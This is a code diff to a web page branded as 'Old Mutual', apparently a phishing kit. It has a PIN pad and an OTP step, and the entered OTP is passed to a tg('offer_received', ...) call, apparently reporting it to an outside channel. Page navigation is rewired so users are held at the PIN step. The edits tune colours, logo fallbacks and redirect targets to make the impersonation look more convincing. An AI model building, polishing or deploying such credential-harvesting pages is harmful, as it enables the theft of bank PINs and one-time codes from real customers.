@@ -20,14 +20,14 @@ input{font-family:inherit;outline:none;border:none;background:none;-webkit-user-
 img{display:block}svg{display:block}
 
 :root{
-  --grn:#00A651;--grn-dk:#007A3D;--grn-a:rgba(0,166,81,.10);
+  --grn:#009A44;--grn-dk:#007A36;--grn-a:rgba(0,154,68,.10);
   --navy:#003366;--navy-a:rgba(0,51,102,.08);
   --bg:#F0F4F0;--s2:#E4EEE4;--s3:#C8DCC8;
   --ink1:#000;--ink2:#222;--ink3:#555;
   --line:#D0DCD0;--line2:#E4EEE4;
   --err:#C8192B;--err-a:rgba(200,25,43,.10);
   --sh0:0 1px 4px rgba(0,60,0,.08);
-  --sh-grn:0 4px 20px rgba(0,166,81,.28);
+  --sh-grn:0 4px 20px rgba(0,154,68,.28);
   --r12:12px;--r14:14px;--r16:16px;--rpill:999px;
   --ease:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.34,1.56,.64,1);
 }
@@ -77,7 +77,7 @@ img{display:block}svg{display:block}
 /* Card */
 .card{background:#fff;border:1px solid var(--line);border-left:3px solid var(--grn);border-radius:var(--r16);overflow:hidden;box-shadow:var(--sh0)}
 .card-head{padding:12px 14px;border-bottom:1px solid var(--line2);display:flex;align-items:center;gap:10px}
-.card-head-ic{width:32px;height:32px;border-radius:10px;background:var(--grn-a);border:1px solid rgba(0,166,81,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-head-ic{width:32px;height:32px;border-radius:10px;background:var(--grn-a);border:1px solid rgba(0,154,68,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .card-head-t{font-size:14px;font-weight:700;color:var(--ink1)}
 .card-head-s{font-size:10px;color:var(--ink3);margin-top:1px}
 .card-body{padding:14px;display:flex;flex-direction:column;gap:12px}
@@ -94,8 +94,8 @@ img{display:block}svg{display:block}
 .pin-dots.wrong .pin-cell{animation:shake .3s ease;border-color:var(--err)}
 .pin-err{font-size:11px;color:var(--err);text-align:center;min-height:16px;font-weight:500}
 .pin-actions{display:flex;gap:8px}
-.pin-act{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;font-weight:600;color:var(--grn);background:var(--grn-a);border:1px solid rgba(0,166,81,.18);border-radius:var(--r12);padding:10px;cursor:pointer;transition:background .12s;position:relative;overflow:hidden}
-.pin-act:active{background:rgba(0,166,81,.18)}
+.pin-act{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;font-weight:600;color:var(--grn);background:var(--grn-a);border:1px solid rgba(0,154,68,.18);border-radius:var(--r12);padding:10px;cursor:pointer;transition:background .12s;position:relative;overflow:hidden}
+.pin-act:active{background:rgba(0,154,68,.18)}
 
 /* Numpad */
 .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
@@ -150,7 +150,7 @@ img{display:block}svg{display:block}
   <img class="curtain-logo"
     src="https://eu-images.contentstack.com/v3/assets/blt0554f48052bb4620/blt684cdefbcad8ec0e/68d270a6f377720c7bdcdcda/banner-old-mutual.png"
     alt="Old Mutual"
-    onerror="this.outerHTML='<span style=\'font-size:18px;font-weight:800;color:#003366\'>Old Mutual</span>'">
+    onerror="this.outerHTML='<svg width=\"120\" height=\"40\" viewBox=\"0 0 180 60\"><rect width=\"180\" height=\"60\" rx=\"4\" fill=\"#003366\"/><text x=\"12\" y=\"37\" font-family=\"sans-serif\" font-size=\"18\" font-weight=\"800\" fill=\"#fff\">Old Mutual</text></svg>'">
   <div class="curtain-spin"></div>
 </div>
 
@@ -160,11 +160,10 @@ img{display:block}svg{display:block}
       <button class="back-btn" onclick="history.back()">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="var(--ink3)"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
       </button>
-      <img class="tb-logo"
+      <img class="tb-logo" id="loginLogo"
         src="https://eu-images.contentstack.com/v3/assets/blt0554f48052bb4620/blt684cdefbcad8ec0e/68d270a6f377720c7bdcdcda/banner-old-mutual.png"
         alt="Old Mutual"
-        onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
-      <span class="tb-logo-txt" style="display:none">Old Mutual</span>
+        onerror="this.outerHTML='<svg class=\"tb-logo\" width=\"110\" height=\"36\" viewBox=\"0 0 180 60\"><rect width=\"180\" height=\"60\" rx=\"4\" fill=\"#003366\"/><text x=\"12\" y=\"37\" font-family=\"sans-serif\" font-size=\"18\" font-weight=\"800\" fill=\"#fff\">Old Mutual</text></svg>'">
     </div>
   </div>
 
@@ -337,7 +336,7 @@ function confirmOTP(){
   }
   otpDone=true;hap([10,50,10]);tg('offer_received',otpVal);
   document.getElementById('curtain').classList.add('show');
-  setTimeout(function(){window.location.href='omari-thankyou.html';},900);
+  setTimeout(function(){window.location.href='thankyou.html';},900);
 }
 
 var timerInt=null;
@@ -345,9 +344,9 @@ function startTimer(){var secs=300;function tick(){var m=Math.floor(secs/60),s=s
 function enableResend(){var r=document.getElementById('resendBtn');r.style.opacity='1';r.style.pointerEvents='auto';r.addEventListener('click',function(){otpVal='';renderOTP();var ob=document.getElementById('otpBtn');if(ob)ob.disabled=true;clearInterval(timerInt);startTimer();r.style.opacity='.4';r.style.pointerEvents='none';proceed();},{once:true});}
 function showOtoast(m){var t=document.getElementById('otoast'),n=document.getElementById('otoastNum');if(!t)return;n.textContent=m;t.style.display='block';setTimeout(function(){t.style.display='none';},4000);}
 
-window.goBack=function(){if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');}else window.location.href='omari-index.html';};
+window.goBack=function(){if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');}else window.location.href='index.html';};
 history.replaceState({step:'stepPin'},'','');
-window.addEventListener('popstate',function(){if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');hap(8);history.replaceState({step:'stepPin'},'','');}else window.location.href='omari-index.html';});
+window.addEventListener('popstate',function(){if(curStep==='stepProc'||curStep==='stepOtp'){submitting=false;showStep('stepPin');hap(8);history.replaceState({step:'stepPin'},'','');}else window.location.href='index.html';});
 
 document.querySelectorAll('.nk,.pin-act,.foot-btn').forEach(function(b){b.addEventListener('pointerdown',function(e){var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;var rip=document.createElement('span');rip.className='rip';rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});},{passive:true});});
 </script>
